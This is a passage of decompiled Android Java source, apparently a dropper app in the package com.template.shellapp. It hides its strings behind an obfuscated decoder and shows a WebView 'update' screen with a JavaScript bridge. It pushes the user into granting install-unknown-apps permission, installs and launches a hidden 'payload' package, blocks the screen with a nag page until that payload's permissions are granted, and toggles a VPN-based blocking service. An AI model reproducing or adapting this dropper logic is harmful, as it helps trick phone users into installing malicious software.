        int i = this.prefs.getInt(C0000.decode(new byte[]{86, 19, 75, 16, 92, 89, 23, 62, 67, 22, 2, 85, 92}, "5f9b97ca0bc292a4", STAGE_WEBVIEW), 0);
        String strDecode = C0000.decode(new byte[]{67, 85, 86, 18, 94, 84, 66, 62, 89, 92, 80, 85}, "404d715a43", false);
        if ((i == STAGE_WEBVIEW || this.prefs.getBoolean(strDecode, false)) && (webViewUrl = getWebViewUrl()) != null && !webViewUrl.isEmpty()) {
            BlockVpnService.INSTANCE.stop(this);
            this.vpnStarted = false;
            enterWebViewMode(webViewUrl);
            return;
        }
        if (!isPayloadInstalled()) {
            WebView webView = new WebView(this);
            this.webView = webView;
            webView.setBackgroundColor(isNightMode() ? Color.parseColor(C0000.decode(new byte[]{18, 9, 82, 3, 2, 3, 0}, "1832c2a880e8")) : -1);
            WebSettings settings = this.webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setAllowFileAccess(true);
            settings.setUseWideViewPort(true);
            settings.setLoadWithOverviewMode(true);
            this.webView.addJavascriptInterface(new WebBridge(), C0000.decode(new byte[]{34, 95, 82, 20, 12, 15, 82}, "c16fcf63deef", 1));
            this.webView.setOverScrollMode(2);
            applyWebViewBackground();
            this.webView.setWebViewClient(new WebViewClient() { // from class: com.template.shellapp.MainActivity.1
                @Override // android.webkit.WebViewClient
                public void onPageFinished(WebView webView2, String str) {
                    super.onPageFinished(webView2, str);
                    MainActivity.this.injectWebTheme();
                    MainActivity.this.restoreStage();
                }
            });
            setContentView(this.webView);
            if (this.prefs.getBoolean(C0000.decode(new byte[]{22, 82, 11, 7, 10, 8, 1, 104, 12, 13, 16, 18, 7, 91, 9}, "f7eccf", 0.0f), false)) {
                this.pendingInstall = true;
            }
            this.webView.loadUrl(C0000.decode(new byte[]{2, 91, 8, 7, 12, 29, 30, 26, 5, 92, 0, 16, 89, 91, 85, 106, 5, 65, 23, 7, 66, 29, 85, 71, 11, 66, 20, 7, 68, 28, 89, 65, 9, 94}, "d2db6215", false));
            return;
        }
        SharedPreferences sharedPreferences = this.prefs;
        String strDecode2 = C0000.decode(new byte[]{2}, "f06b0ef609faee", false);
        if (!sharedPreferences.getBoolean(strDecode2, false)) {
            this.prefs.edit().putBoolean(strDecode2, true).apply();
        }
        String strTargetPackage = targetPackage();
        if (strTargetPackage == null || !isPayloadPermissionGranted(strTargetPackage)) {
            saveStage(4);
            launchPayload();
            enterNagMode();
            return;
        }
        BlockVpnService.INSTANCE.stop(this);
        this.vpnStarted = false;
        String webViewUrl2 = getWebViewUrl();
        if (webViewUrl2 == null || webViewUrl2.isEmpty()) {
            launchPayload();
            finish();
        } else {
            saveStage(STAGE_WEBVIEW);
            this.prefs.edit().putBoolean(strDecode, true).apply();
            enterWebViewMode(webViewUrl2);
        }
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
        if (this.webviewMode) {
            return;
        }
        stopPermissionPoller();
        boolean zCanRequestPackageInstalls = getPackageManager().canRequestPackageInstalls();
        String str = C0000.decode(new byte[]{95, 13, 99, 84, 16, 77, 93, 6, 11, 17, 19, 93, 94, 7, 88, 95, 4, 113, 94, 16, 69, 80, 15, 84, 13}, "0c11c8") + this.pendingInstall + C0000.decode(new byte[]{21, 94, 94, 74, 67, 81, 93, 88, 80, 91, 87, 11}, "5709701495061ff5", STAGE_WEBVIEW) + this.installing + C0000.decode(new byte[]{65, 87, 80, 94, 123, 95, 18, 64, 0, 88, 93, 13}, "a41021a4") + zCanRequestPackageInstalls + C0000.decode(new byte[]{16, 91, 81, 82, ByteCompanionObject.MAX_VALUE, 14, 93, 92, 12}, "05052a991ff1", true) + this.nagMode;
        String strDecode = C0000.decode(new byte[]{113, 55, 41, 50, 96, 38, 102, 59, 38, 114, 116}, "5efb0c4db038d2b4", 0);
        Log.d(strDecode, str);
        if (isPayloadInstalled()) {
            SharedPreferences sharedPreferences = this.prefs;
            String strDecode2 = C0000.decode(new byte[]{84}, "060dbe95", 0.0f);
            if (!sharedPreferences.getBoolean(strDecode2, false)) {
                this.prefs.edit().putBoolean(strDecode2, true).apply();
            }
            String strTargetPackage = targetPackage();
            if (strTargetPackage == null || !isPayloadPermissionGranted(strTargetPackage)) {
                launchPayload();
                enterNagMode();
                return;
            }
            Log.d(strDecode, C0000.decode(new byte[]{14, 12, 99, 1, 66, 22, 93, 92, 89, 20, 94, 80, 24, 66, 65, 1, 67, 14, 89, 74, 16, 93, 90, 91, 65, 45, ByteCompanionObject.MAX_VALUE}, "ab1d1c09c455", 0.0f));
            BlockVpnService.INSTANCE.stop(this);
            this.vpnStarted = false;
            String webViewUrl = getWebViewUrl();
            if (webViewUrl == null || webViewUrl.isEmpty()) {
                launchPayload();
                finish();
                return;
            } else {
                saveStage(STAGE_WEBVIEW);
                this.prefs.edit().putBoolean(C0000.decode(new byte[]{17, 6, 82, 66, 12, 85, 17, 60, 93, 91, 1, 85}, "fc04e0", 3), true).apply();
                enterWebViewMode(webViewUrl);
                return;
            }
        }
        if (this.nagMode) {
            String strTargetPackage2 = targetPackage();
            if (strTargetPackage2 == null || !isPayloadPermissionGranted(strTargetPackage2)) {
                return;
            }
            BlockVpnService.INSTANCE.stop(this);
            this.vpnStarted = false;
            finish();
            return;
        }
        if (!this.pendingInstall) {
            if (this.installing) {
                this.installing = false;
                return;
            }
            return;
        }
        this.pendingInstall = false;
        this.prefs.edit().remove(C0000.decode(new byte[]{65, 87, 89, 81, 13, 87, 4, 59, 92, 93, 67, 18, 2, 89, 93}, "1275d9cd530fc5", true)).apply();
        if (!zCanRequestPackageInstalls) {
            Log.d(strDecode, C0000.decode(new byte[]{10, 93, 54, 82, 75, 16, 9, 87, 14, 65, 21, 86, 22, 90, 81, 22, 23, 91, 91, 15, 69, 125, 43, 99, 24, 2, 22, 83, 90, 21, 0, 87, 72, 23, 75, 13, 11, 69, 20, 17, 0, 65, 9, 94, 75, 22, 13, 93, 90, 65, 22, 80, 22, 82, 93, 11}, "e3d78ed24a", STAGE_WEBVIEW));
            callJs(C0000.decode(new byte[]{16, 89, 91, 67, 55, 87, 74, 85, 85, 91, 17, 68, 20, 92, 17, 92, 93, 71, 23, 93, 87, 94, 23, 28}, "c144d480059cd9", false));
        } else {
            Log.d(strDecode, C0000.decode(new byte[]{87, 93, 48, 6, 23, 69, 84, 83, 2, 19, 18, 6, 22, 93, 80, 69, 75, 90, 13, 13, 68, 87, 75, 87, 86, 71, 7, 7, 72, 16, 80, 88, 75, 71, 3, 15, 8, 89, 87, 81}, "83bcd096"));
            saveStage(3);
            callJs(C0000.decode(new byte[]{74, 95, 87, 18, 101, 84, 68, 92, 93, 89, 76, 66, 13, 91, 74, 66, 88, 91, 84, 66, 31}, "978e676987ded596"));
            doInstall();
        }
    }

    @Override // android.app.Activity
    public void onBackPressed() {
        WebView webView;
        if (this.webviewMode && (webView = this.webView) != null && webView.canGoBack()) {
            this.webView.goBack();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void callJs(final String str) {
        this.h.post(new Runnable() { // from class: com.template.shellapp.MainActivity$$ExternalSyntheticLambda5
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m13lambda$callJs$0$comtemplateshellappMainActivity(str);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$callJs$0$com-template-shellapp-MainActivity, reason: not valid java name */
    /* synthetic */ void m13lambda$callJs$0$comtemplateshellappMainActivity(String str) {
        WebView webView = this.webView;
        if (webView != null) {
            webView.evaluateJavascript(str, null);
        }
    }

    public class WebBridge {
        /* JADX INFO: renamed from: lambda$notifyScreen$1$com-template-shellapp-MainActivity$WebBridge, reason: not valid java name */
        /* synthetic */ void m18x8988cbb(String str) {
            str.hashCode();
            byte b = -1;
            switch (str.hashCode()) {
                case -838846263:
                    if (str.equals(C0000.decode(new byte[]{16, 20, 5, 2, 64, 85}, "edac400f14a6", 0.0f))) {
                        b = 0;
                    }
                    break;
                case -517618225:
                    if (str.equals(C0000.decode(new byte[]{68, 92, 67, 92, 10, 16, 16, 90, 89, 15}, "4911ccc36adbc1", 0.0f))) {
                        b = 1;
                    }
                    break;
                case 1957569947:
                    if (str.equals(C0000.decode(new byte[]{90, 86, 69, 65, 87, 90, 8}, "386566d5b80d"))) {
                        b = 2;
                    }
                    break;
            }
            switch (b) {
                case 0:
                    MainActivity.this.saveStage(1);
                    break;
                case 1:
                    MainActivity.this.saveStage(2);
                    break;
                case 2:
                    MainActivity.this.saveStage(3);
                    break;
            }
        }

        /* JADX INFO: renamed from: lambda$onUpdateClick$0$com-template-shellapp-MainActivity$WebBridge, reason: not valid java name */
        /* synthetic */ void m19xa5589d0b() {
            if (MainActivity.this.installing) {
                return;
            }
            if (!MainActivity.this.getPackageManager().canRequestPackageInstalls()) {
                MainActivity.this.saveStage(2);
                MainActivity.this.callJs(C0000.decode(new byte[]{22, 10, 94, 79, 100, 80, 23, 7, 84, 86, 31, 20, 21, 7, 67, 85, 94, 64, 22, 11, 94, 86, 16, 26}, "eb1873", 0.0f));
            } else {
                MainActivity.this.saveStage(3);
                MainActivity.this.callJs(C0000.decode(new byte[]{22, 89, 14, 71, 96, 7, 66, 86, 7, 12, 73, 20, 12, 95, 18, 68, 82, 8, 92, 20, 75}, "e1a03d03bba3", MainActivity.STAGE_WEBVIEW));
                MainActivity.this.doInstall();
            }
        }

        /* JADX INFO: renamed from: lambda$openSettings$2$com-template-shellapp-MainActivity$WebBridge, reason: not valid java name */
        /* synthetic */ void m20x95bc27e2() {
            MainActivity.this.saveStage(2);
            MainActivity.this.pendingInstall = true;
            MainActivity.this.prefs.edit().putBoolean(C0000.decode(new byte[]{67, 87, 86, 92, 90, 8, 6, 104, 90, 92, 75, 76, 82, 10, 13}, "32883fa7", 0.0f), true).apply();
            MainActivity.this.startActivity(new Intent(C0000.decode(new byte[]{4, 13, 1, 64, 12, 12, 1, 77, 22, 87, 23, 17, 12, 13, 2, 65, 77, 40, 36, 45, 36, 117, 38, 58, 48, 45, 46, 124, 44, 50, 43, 60, 36, 98, 51, 58, 54, 44, 48, 96, 32, 32, 54}, "ece2ce", 0.0f), Uri.parse(C0000.decode(new byte[]{69, 80, 2, 94, 7, 84, 82, 14}, "51a5f374", 0.0f) + MainActivity.this.getPackageName())));
            MainActivity.this.startPermissionPoller();
        }

        public WebBridge() {
        }

        @JavascriptInterface
        public void onUpdateClick() {
            MainActivity.this.h.post(new Runnable() { // from class: com.template.shellapp.MainActivity$WebBridge$$ExternalSyntheticLambda1
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m19xa5589d0b();
                }
            });
        }

        @JavascriptInterface
        public void notifyScreen(final String str) {
            MainActivity.this.h.post(new Runnable() { // from class: com.template.shellapp.MainActivity$WebBridge$$ExternalSyntheticLambda2
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m18x8988cbb(str);
                }
            });
        }

        @JavascriptInterface
        public void openSettings() {
            MainActivity.this.h.post(new Runnable() { // from class: com.template.shellapp.MainActivity$WebBridge$$ExternalSyntheticLambda0
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m20x95bc27e2();
                }
            });
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void startPermissionPoller() {
        stopPermissionPoller();
        Runnable runnable = new Runnable() { // from class: com.template.shellapp.MainActivity.2
            @Override // java.lang.Runnable
            public void run() {
                if (MainActivity.this.isFinishing()) {
                    return;
                }
                if (MainActivity.this.getPackageManager().canRequestPackageInstalls()) {
                    Intent intent = new Intent(MainActivity.this, (Class<?>) MainActivity.class);
                    intent.setFlags(537001984);
                    MainActivity.this.startActivity(intent);
                    return;
                }
                MainActivity.this.h.postDelayed(this, 500L);
            }
        };
        this.permPoller = runnable;
        this.h.postDelayed(runnable, 800L);
    }

    private void stopPermissionPoller() {
        Runnable runnable = this.permPoller;
        if (runnable != null) {
            this.h.removeCallbacks(runnable);
            this.permPoller = null;
        }
    }

    private void startInstallThread() {
        new Thread(new Runnable() { // from class: com.template.shellapp.MainActivity$$ExternalSyntheticLambda2
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m16lambda$startInstallThread$1$comtemplateshellappMainActivity();
            }
        }).start();
        this.h.postDelayed(new Runnable() { // from class: com.template.shellapp.MainActivity$$ExternalSyntheticLambda3
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m17lambda$startInstallThread$2$comtemplateshellappMainActivity();
            }
        }, 30000L);
    }

    private boolean isNightMode() {
        return (getResources().getConfiguration().uiMode & 48) == 32;
    }

    private boolean isPayloadInstalled() {
        String strTargetPackage = targetPackage();
        if (strTargetPackage == null) {
            return false;
        }
        try {
            getPackageManager().getPackageInfo(strTargetPackage, 0);
            return true;
        } catch (Exception unused) {
            return false;
        }
    }

    private void launchPayload() {
        String strTargetPackage = targetPackage();
        if (strTargetPackage == null) {
            return;
        }
        try {
            Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(strTargetPackage);
            if (launchIntentForPackage != null) {
                launchIntentForPackage.addFlags(268435456);
                startActivity(launchIntentForPackage);
            }
        } catch (Exception unused) {
        }
    }

    private void enterNagMode() {
        this.nagMode = true;
        WebView webView = this.webView;
        if (webView != null) {
            ((ViewGroup) webView.getParent()).removeView(this.webView);
        }
        setContentView(buildNagPage());
        scheduleNagCheck();
    }

    private void scheduleNagCheck() {
        this.h.postDelayed(new Runnable() { // from class: com.template.shellapp.MainActivity$$ExternalSyntheticLambda4
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m14lambda$scheduleNagCheck$4$comtemplateshellappMainActivity();
            }
        }, 2000L);
    }
}
